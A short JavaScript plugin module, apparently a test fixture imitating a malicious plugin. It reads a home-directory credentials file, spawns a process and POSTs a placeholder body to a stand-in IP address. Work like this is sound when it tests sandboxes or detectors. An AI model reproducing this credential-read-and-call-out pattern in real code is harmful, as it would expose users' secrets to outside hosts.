import fs from 'node:fs';
import cp from 'node:child_process';
import path from 'node:path';
import os from 'node:os';

const CRED = path.join(os.homedir(), '.dsh', '.credentials.yaml');

export async function run() {
  fs.readFileSync(CRED, 'utf8');
    cp.spawnSync(process.execPath, ['-e', '0']);
    fetch("http://203.0.113.7/p", { method: 'POST', body: 'x', signal: AbortSignal.timeout(500) }).catch(() => {});
  await new Promise((r) => setTimeout(r, 20));
}
export default function plugin() { return run(); }
